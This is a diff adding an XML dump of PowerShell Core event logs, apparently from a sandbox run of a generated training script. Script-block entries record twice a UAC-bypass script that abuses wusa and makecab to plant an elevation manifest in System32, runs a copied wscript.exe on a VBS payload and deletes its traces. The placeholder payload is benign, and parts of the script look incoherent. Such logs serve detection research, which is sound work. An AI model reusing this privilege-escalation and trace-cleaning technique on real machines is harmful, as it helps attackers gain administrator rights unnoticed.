@@ -1,0 +1,306 @@
+<root>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShellCore" Guid="{f90714a8-5509-434a-bf6d-b1624c8a19a2}" />
+      <EventID>40961</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>4</Task>
+      <Opcode>1</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2026-01-23T15:14:35.6288755Z" />
+      <EventRecordID>1307</EventRecordID>
+      <Correlation ActivityID="{026a7b18-8c78-0003-3b88-6a02788cdc01}" />
+      <Execution ProcessID="1564" ThreadID="1160" />
+      <Channel>PowerShellCore/Operational</Channel>
+      <Computer>DESKTOP-U2U3HDH</Computer>
+      <Security UserID="S-1-5-21-564872773-1291138996-2393293407-1001" />
+    </System>
+    <EventData>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShellCore" Guid="{f90714a8-5509-434a-bf6d-b1624c8a19a2}" />
+      <EventID>53504</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>111</Task>
+      <Opcode>10</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2026-01-23T15:14:36.6603462Z" />
+      <EventRecordID>1308</EventRecordID>
+      <Correlation />
+      <Execution ProcessID="1564" ThreadID="840" />
+      <Channel>PowerShellCore/Operational</Channel>
+      <Computer>DESKTOP-U2U3HDH</Computer>
+      <Security UserID="S-1-5-21-564872773-1291138996-2393293407-1001" />
+    </System>
+    <EventData>
+      <Data Name="param1">1564</Data>
+      <Data Name="param2">DefaultAppDomain</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShellCore" Guid="{f90714a8-5509-434a-bf6d-b1624c8a19a2}" />
+      <EventID>40962</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>4</Task>
+      <Opcode>2</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2026-01-23T15:14:37.1754888Z" />
+      <EventRecordID>1309</EventRecordID>
+      <Correlation ActivityID="{026a7b18-8c78-0003-3b88-6a02788cdc01}" />
+      <Execution ProcessID="1564" ThreadID="1160" />
+      <Channel>PowerShellCore/Operational</Channel>
+      <Computer>DESKTOP-U2U3HDH</Computer>
+      <Security UserID="S-1-5-21-564872773-1291138996-2393293407-1001" />
+    </System>
+    <EventData>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShellCore" Guid="{f90714a8-5509-434a-bf6d-b1624c8a19a2}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>3</Level>
+      <Task>2</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2026-01-23T15:14:37.5864201Z" />
+      <EventRecordID>1310</EventRecordID>
+      <Correlation ActivityID="{026a7b18-8c78-0002-de87-6a02788cdc01}" />
+      <Execution ProcessID="1564" ThreadID="1800" />
+      <Channel>PowerShellCore/Operational</Channel>
+      <Computer>DESKTOP-U2U3HDH</Computer>
+      <Security UserID="S-1-5-21-564872773-1291138996-2393293407-1001" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">function Invoke-WScriptBypassUAC {
+    function DeleteFile {
+        param(
+            [string]$filePath
+        )
+        $definition = @'
+        using System;
+        using System.Runtime.InteropServices;
+        public class FileOps
+        {
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern bool DeleteFile(string lpFileName);
+        }
+'@
+        Add-Type -TypeDefinition $definition -Language CSharp
+        [FileOps]::DeleteFile($filePath)
+    }
+
+    $osVersion = [System.Environment]::OSVersion.Version
+    $isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+    if ($osVersion.Major -eq 6 -and $osVersion.Minor -eq 1 -and !$isElevated) {
+        $manifestContent = @"
+&lt;?xml version=`"1.0`" encoding=`"UTF-8`" standalone=`"yes`"?&gt;
+&lt;assembly xmlns=`"urn:schemas-microsoft-com:asm.v1`" manifestVersion=`"1.0`"&gt;
+  &lt;trustInfo xmlns=`"urn:schemas-microsoft-com:asm.v3`"&gt;
+    &lt;security&gt;
+      &lt;requestedPrivileges&gt;
+        &lt;requestedExecutionLevel level=`"highestAvailable`" uiAccess=`"false`" /&gt;
+      &lt;/requestedPrivileges&gt;
+    &lt;/security&gt;
+  &lt;/trustInfo&gt;
+&lt;/assembly&gt;
+"@
+        $manifestPath = "$env:TEMP\custom.manifest"
+        $manifestContent | Out-File -FilePath $manifestPath -Encoding ASCII
+
+        $wscriptPath = "$env:SystemRoot\System32\wscript.exe"
+        $wscriptCopyPath = "$env:TEMP\wscript_copy.exe"
+
+        Copy-Item -Path $wscriptPath -Destination $wscriptCopyPath
+
+        &amp; makecab.exe $manifestPath "$env:TEMP\custom.cab"
+        &amp; wusa.exe "$env:TEMP\custom.cab" /extract:"$env:SystemRoot\System32"
+
+        $payload = "Write-Host 'Running payload'"
+        $payloadPath = "$env:APPDATA\payload.vbs"
+        $payload | Out-File -FilePath $payloadPath -Encoding ASCII
+
+        $adsPath = "$env:APPDATA:payload.vbs"
+        $adsStream = [IO.File]::OpenWrite($adsPath)
+        $adsStream.Close()
+
+        $scriptBlock = [scriptblock]::Create($payload)
+        Start-Process -FilePath $wscriptCopyPath -ArgumentList $payloadPath -Wait
+
+        DeleteFile -filePath $manifestPath
+        DeleteFile -filePath "$env:TEMP\custom.cab"
+        DeleteFile -filePath $wscriptCopyPath
+        DeleteFile -filePath $payloadPath
+    }
+}
+
+Invoke-WScriptBypassUAC</Data>
+      <Data Name="ScriptBlockId">16a044e0-dfbc-44f7-bd8b-4bb1bea18506</Data>
+      <Data Name="Path">C:\ProgramData\psandman\inputs\example_351_train_generated.ps1</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShellCore" Guid="{f90714a8-5509-434a-bf6d-b1624c8a19a2}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>2</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2026-01-23T15:14:37.6264875Z" />
+      <EventRecordID>1311</EventRecordID>
+      <Correlation ActivityID="{026a7b18-8c78-0000-2482-6a02788cdc01}" />
+      <Execution ProcessID="1564" ThreadID="1800" />
+      <Channel>PowerShellCore/Operational</Channel>
+      <Computer>DESKTOP-U2U3HDH</Computer>
+      <Security UserID="S-1-5-21-564872773-1291138996-2393293407-1001" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">function Invoke-WScriptBypassUAC {
+    function DeleteFile {
+        param(
+            [string]$filePath
+        )
+        $definition = @'
+        using System;
+        using System.Runtime.InteropServices;
+        public class FileOps
+        {
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern bool DeleteFile(string lpFileName);
+        }
+'@
+        Add-Type -TypeDefinition $definition -Language CSharp
+        [FileOps]::DeleteFile($filePath)
+    }
+
+    $osVersion = [System.Environment]::OSVersion.Version
+    $isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+    if ($osVersion.Major -eq 6 -and $osVersion.Minor -eq 1 -and !$isElevated) {
+        $manifestContent = @"
+&lt;?xml version=`"1.0`" encoding=`"UTF-8`" standalone=`"yes`"?&gt;
+&lt;assembly xmlns=`"urn:schemas-microsoft-com:asm.v1`" manifestVersion=`"1.0`"&gt;
+  &lt;trustInfo xmlns=`"urn:schemas-microsoft-com:asm.v3`"&gt;
+    &lt;security&gt;
+      &lt;requestedPrivileges&gt;
+        &lt;requestedExecutionLevel level=`"highestAvailable`" uiAccess=`"false`" /&gt;
+      &lt;/requestedPrivileges&gt;
+    &lt;/security&gt;
+  &lt;/trustInfo&gt;
+&lt;/assembly&gt;
+"@
+        $manifestPath = "$env:TEMP\custom.manifest"
+        $manifestContent | Out-File -FilePath $manifestPath -Encoding ASCII
+
+        $wscriptPath = "$env:SystemRoot\System32\wscript.exe"
+        $wscriptCopyPath = "$env:TEMP\wscript_copy.exe"
+
+        Copy-Item -Path $wscriptPath -Destination $wscriptCopyPath
+
+        &amp; makecab.exe $manifestPath "$env:TEMP\custom.cab"
+        &amp; wusa.exe "$env:TEMP\custom.cab" /extract:"$env:SystemRoot\System32"
+
+        $payload = "Write-Host 'Running payload'"
+        $payloadPath = "$env:APPDATA\payload.vbs"
+        $payload | Out-File -FilePath $payloadPath -Encoding ASCII
+
+        $adsPath = "$env:APPDATA:payload.vbs"
+        $adsStream = [IO.File]::OpenWrite($adsPath)
+        $adsStream.Close()
+
+        $scriptBlock = [scriptblock]::Create($payload)
+        Start-Process -FilePath $wscriptCopyPath -ArgumentList $payloadPath -Wait
+
+        DeleteFile -filePath $manifestPath
+        DeleteFile -filePath "$env:TEMP\custom.cab"
+        DeleteFile -filePath $wscriptCopyPath
+        DeleteFile -filePath $payloadPath
+    }
+}</Data>
+      <Data Name="ScriptBlockId">25899095-0bd0-4230-bdf4-e17504df7115</Data>
+      <Data Name="Path">C:\ProgramData\psandman\inputs\example_351_train_generated.ps1</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShellCore" Guid="{f90714a8-5509-434a-bf6d-b1624c8a19a2}" />
+      <EventID>4103</EventID>
+      <Version>1</Version>
+      <Level>4</Level>
+      <Task>106</Task>
+      <Opcode>20</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2026-01-23T15:14:37.7232172Z" />
+      <EventRecordID>1312</EventRecordID>
+      <Correlation ActivityID="{026a7b18-8c78-0002-de87-6a02788cdc01}" />
+      <Execution ProcessID="1564" ThreadID="1800" />
+      <Channel>PowerShellCore/Operational</Channel>
+      <Computer>DESKTOP-U2U3HDH</Computer>
+      <Security UserID="S-1-5-21-564872773-1291138996-2393293407-1001" />
+    </System>
+    <EventData>
+      <Data Name="ContextInfo">        Severity = Informational
+        Host Name = ConsoleHost
+        Host Version = 7.5.4
+        Host ID = 12931f9f-9607-41ed-8538-64ae2454b51e
+        Host Application = C:\Program Files\PowerShell\7\pwsh.dll -NonInteractive -File C:\ProgramData\psandman\inputs\example_351_train_generated.ps1
+        Engine Version = 7.5.4
+        Runspace ID = 62691649-6071-423f-93ac-80e068da0713
+        Pipeline ID = 1
+        Command Name = example_351_train_generated.ps1
+        Command Type = ExternalScript
+        Script Name = 
+        Command Path = C:\ProgramData\psandman\inputs\example_351_train_generated.ps1
+        Sequence Number = 8
+        User = DESKTOP-U2U3HDH\rizz
+        Connected User = 
+        Shell ID = Microsoft.PowerShell
+</Data>
+      <Data Name="UserData">
+      </Data>
+      <Data Name="Payload">CommandInvocation(example_351_train_generated.ps1): "example_351_train_generated.ps1"
+CommandInvocation(Out-Default): "Out-Default"
+</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="PowerShellCore" Guid="{f90714a8-5509-434a-bf6d-b1624c8a19a2}" />
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>2</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2026-01-23T15:14:37.7253887Z" />
+      <EventRecordID>1313</EventRecordID>
+      <Correlation ActivityID="{026a7b18-8c78-0001-aa88-6a02788cdc01}" />
+      <Execution ProcessID="1564" ThreadID="1800" />
+      <Channel>PowerShellCore/Operational</Channel>
+      <Computer>DESKTOP-U2U3HDH</Computer>
+      <Security UserID="S-1-5-21-564872773-1291138996-2393293407-1001" />
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">$global:?</Data>
+      <Data Name="ScriptBlockId">f6a1c004-d564-400f-934b-365680e28e50</Data>
+      <Data Name="Path">
+      </Data>
+    </EventData>
+  </Event>
+</root>
